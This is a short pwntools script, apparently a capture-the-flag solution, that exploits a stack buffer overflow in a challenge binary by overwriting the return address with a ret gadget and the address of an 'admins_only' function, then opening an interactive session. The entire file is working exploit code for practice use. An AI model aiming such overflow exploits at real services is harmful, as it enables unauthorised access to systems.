from pwn import *
import sys

if sys.argv[1] == "remote":
    p = remote("", 9002)
else:
    elf = context.binary = ELF("./pwn")
    p = process()
context.log_level = "debug"

## Ret 2 win (admin_only)

#ret_addr = p64(elf.symbols["admins_only"])
ret_addr = p64(0x00401554)
offset = 32 + 8
ret_gad = p64(0x0000000000401016)
dummy_ret = p64(elf.entry)  # or another stable code address

payload = b"A"*offset + ret_gad + ret_addr 
#payload = b"A"*offset + ret_addr + dummy_ret


p.recvuntil('channel: ')
p.sendline(b'3')
p.recvuntil('[pwner]: ')
p.sendline(payload)
#p.recv(100, timeout=2)
p.interactive()